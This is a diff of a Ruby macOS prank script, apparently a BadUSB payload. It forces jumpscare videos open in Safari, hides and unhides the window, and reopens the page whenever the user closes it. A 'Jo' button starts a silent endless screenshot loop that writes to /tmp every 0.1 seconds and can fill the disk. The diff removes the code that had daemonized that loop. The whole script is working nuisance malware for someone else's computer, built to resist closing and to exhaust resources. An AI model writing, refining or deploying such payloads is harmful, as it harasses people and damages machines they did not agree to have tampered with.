@@ -82,7 +82,7 @@ def persistent_jumpscare(video_url)
     system("open -a Safari '#{html_file}'")
     # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.85 seconds before unhiding (simulating waiting for sound detection).
+    # Wait 0.85 seconds (simulate waiting for sound detection).
     sleep 0.85
     # Unhide Safari so the jumpscare becomes visible.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
@@ -102,7 +102,7 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If the jumpscare page is not found, force it to reopen.
+    # If the jumpscare page is not found, re-open it.
     unless result.include?("true")
       system("open -a Safari '#{html_file}'")
     end
@@ -110,19 +110,14 @@ def persistent_jumpscare(video_url)
   end
 end
 
-# --- Spam Screenshots Function (Detaches and runs continuously) ---
+# --- Spam Screenshots Function ---
 def spam_screenshots
-  pid = fork do
-    # Detach this process, so it keeps running in the background.
-    Process.daemon(true, true)
-    loop do
-      timestamp = Time.now.to_f.to_s.gsub('.', '')
-      output_file = "/tmp/screenshot_#{timestamp}.jpg"
-      system("screencapture -x #{output_file}")
-      sleep 0.1
-    end
+  loop do
+    timestamp = Time.now.to_f.to_s.gsub('.', '')
+    output_file = "/tmp/screenshot_#{timestamp}.jpg"
+    system("screencapture -x #{output_file}")
+    sleep 0.1
   end
-  Process.detach(pid)
 end
 
 # --- Run Secret (Rickroll) Script ---
@@ -137,15 +132,9 @@ def first_subscriber_prompt
 end
 
 # --- Second Subscriber Prompt ---
-# When the user selects "Next", display a dialog with two buttons: "Sydney lover" and "Slay"
-# Now we add a new prompt next to it with one button "Jo" for screenshots.
+# When the user selects "Next", display a second dialog with three buttons: "Sydney lover", "Slay", and "Jo".
 def second_subscriber_prompt
-  # Second prompt with two buttons.
-  second_choice = display_dialog("Choose a button:", ["Sydney lover", "Slay"], "Sydney lover")
-  # Immediately next to it, show an independent prompt with one button "Jo".
-  jo_choice = display_dialog("Also, press the button if you want to activate Jo:", ["Jo"], "Jo")
-  # Return both choices as a hash.
-  { second: second_choice, jo: jo_choice }
+  display_dialog("Choose a button:", ["Sydney lover", "Slay", "Jo"], "Sydney lover")
 end
 
 # --- Subscriber Action ---
@@ -163,11 +152,9 @@ def subscriber_action
   elsif first_choice == "tuah"
     persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
   elsif first_choice == "next"
-    choices = second_subscriber_prompt
-    second_choice = choices[:second]
-    jo_choice = choices[:jo]
+    second_choice = second_subscriber_prompt
     if second_choice.nil?
-      puts "No second prompt choice. Exiting."
+      puts "No button chosen. Exiting."
       exit 0
     end
     second_choice = second_choice.strip.downcase
@@ -175,12 +162,10 @@ def subscriber_action
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
     elsif second_choice == "slay"
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
-    else
-      puts "Unexpected choice in second prompt: #{second_choice}"
-    end
-    # Check if the "Jo" button was pressed; if so, start spamming screenshots.
-    if jo_choice && jo_choice.strip.downcase == "jo"
+    elsif second_choice == "jo"
       spam_screenshots
+    else
+      puts "Unexpected button choice in second prompt: #{second_choice}"
     end
   else
     puts "Unexpected button choice in first prompt: #{first_choice}"
@@ -202,6 +187,6 @@ if subscribed.downcase == "no"
   video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
   persistent_jumpscare(video_url)
 else
-  # Subscriber branch.
+  # Subscriber branch: Execute the subscriber action which involves two-tier prompts.
   subscriber_action
 end
